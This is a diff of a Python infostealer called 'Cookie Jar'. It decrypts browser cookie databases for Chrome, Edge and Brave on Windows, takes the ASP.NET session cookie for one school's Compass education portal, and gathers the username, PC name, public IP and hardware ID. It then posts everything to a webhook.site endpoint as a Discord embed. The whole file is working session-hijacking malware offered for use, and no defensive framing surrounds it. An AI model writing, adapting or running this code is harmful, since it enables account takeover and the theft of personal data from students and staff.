@@ -5,15 +5,59 @@
 #  \________/\____/ \____/|__|_ \__|\_____>________(______/__|   
       
 
-# pip install pycryptodomex pywin32
+hostKey = '.mullauna-vic.compass.education'
+cookiePrefix = "ASP.NET_SessionId="
+webhookUrl = 'http://webhook.site'
+
+# pip install pycryptodomex pywin32 discord
 import os
-import json
-import base64
-import sqlite3
-import requests
+from re import findall
+from uuid import getnode
+from json import loads, dumps
+from base64 import b64decode
+from sqlite3 import connect
+from requests import post, get
+from time import localtime, strftime
 from shutil import copyfile
 from Cryptodome.Cipher import AES
 from win32crypt import CryptUnprotectData
+from discord import Embed
+
+
+def main():
+	global webhook, embed
+
+	# Browser appdata paths
+	paths = [
+	os.getenv("APPDATA") + "/../Local/BraveSoftware/Brave-Browser/",
+	os.getenv("APPDATA") + "/../Local/Microsoft/Edge/",
+	os.getenv("APPDATA") + "/../Local/Google/Chrome/",
+	]
+
+	embed = Embed(title="Cookie Jar", color=15535980)
+
+	# Search Paths for cookies
+	for path in paths: 
+		if os.path.exists(path):
+			try:
+				getCookie(path)
+				os.remove(os.getenv("APPDATA") + '/../Local/Temp/Cookies')
+			except:
+				continue
+		else:
+			continue
+	
+	# Get SysInfo
+	getInfo()
+
+	# Generate Embed
+	embed.set_author(name=f"@ {strftime('%D | %H:%M:%S', localtime())}")
+	embed.set_footer(text="Cookied Jar | Logger for Compass")
+	embed.set_thumbnail(url="")
+	post(webhookUrl,json=embed.to_dict())
+	# print(dumps(embed.to_dict(), indent=4))
+	
+
 
 def getCookie(path):
 
@@ -27,17 +71,17 @@ def getCookie(path):
 	# Load encryption key
 	encrypted_key = None
 	with open(path+"User Data/Local State", 'r') as file:
-		encrypted_key = json.loads(file.read())['os_crypt']['encrypted_key']
-	encrypted_key = base64.b64decode(encrypted_key)
+		encrypted_key = loads(file.read())['os_crypt']['encrypted_key']
+	encrypted_key = b64decode(encrypted_key)
 	encrypted_key = encrypted_key[5:]
 	decrypted_key = CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
 
 	# Connect to the Database
-	conn = sqlite3.connect(dbpath)
+	conn = connect(dbpath)
 	cursor = conn.cursor()
 
 	# Decode encrypted_value
-	cursor.execute("SELECT encrypted_value FROM cookies WHERE host_key='.mullauna-vic.compass.education'") 
+	cursor.execute(f"SELECT encrypted_value FROM cookies WHERE host_key='{hostKey}'") 
 	encrypted_value = cursor.fetchall()[0][0]
 	cipher = AES.new(decrypted_key, AES.MODE_GCM, nonce=encrypted_value[3:3+12])
 	decrypted_value = cipher.decrypt_and_verify(encrypted_value[3+12:-16], encrypted_value[-16:]) 
@@ -46,70 +90,18 @@ def getCookie(path):
 	conn.commit()
 	conn.close()
 
-	# add netkey to netKeys
-	return str("ASP.NET_SessionId="+decrypted_value.decode("utf-8"))
+	Cookie = str(decrypted_value.decode("utf-8"))
+	embed.add_field(name="Found Cookie", value=f"```\nCookie: {cookiePrefix}{Cookie}\n```", inline=False)
 
-def getSysInfo():
-	# Get username, pc name, IP
-	sysinfo = []
-	sysinfo.append(os.getlogin())
-	sysinfo.append(os.getenv("COMPUTERNAME"))
-	sysinfo.append(requests.get('https://api.ipify.org/').text)
-	return sysinfo	
 
-def postData(data):
-	# Send data to backend webhook
-	postUrl = ""
-	requests.post(postUrl,json=data)
+def getInfo():
+	# Get username, pc name, IP, HWID
+	pcUsername = os.getlogin()
+	pcName = os.getenv("COMPUTERNAME")
+	pcIP = get('https://api.ipify.org/').text
+	pcHWID = ':'.join(findall('..', '%012x' % getnode()))
 
-paths = [
-	# Paths for Chrome, Brave, Edge
-	os.getenv("APPDATA") + "/../Local/BraveSoftware/Brave-Browser/",
-	os.getenv("APPDATA") + "/../Local/Microsoft/Edge/",
-	os.getenv("APPDATA") + "/../Local/Google/Chrome/",
-]
+	embed.add_field(name="SysInfo", value=f"```\nIP: {pcIP}\nHWID: {pcHWID}\n\nPC Username: {pcUsername}\nPC Name: {pcName}\n```", inline=False)
 
-netCookies = [
-	# Define netCookies table
-]
-
-for path in paths: 
-	# Check path and try getCookie
-	if os.path.exists(path):
-		try:
-			netCookies.append(getCookie(path))
-			os.remove(os.getenv("APPDATA") + '/../Local/Temp/Cookies')
-		except:
-			continue
-	else:
-		continue
-
-sysInfo = getSysInfo()
-
-embed = {
-	"username":"CookieJar",
-	"avatar_url":"https://cdn.discordapp.com/attachments/823027129133432863/1032164219933691964/cookie.png",
-	"title":"Cookie Jar Result",
-	"embeds": [{
-		"fields":[
-			{
-				"name":"Compass Session Cookie",
-				"value":netCookies[0],
-			},
-			{
-				"name":"Username",
-				"value":sysInfo[0]
-			},
-			{
-				"name":"PC Name",
-				"value":sysInfo[1]
-			},
-			{
-				"name":"IP",
-				"value":sysInfo[2]
-			},
-		],
-	}]
-}
-
-postData(embed)
+main()
+# input(f"\n\nPress ENTER to close...") 
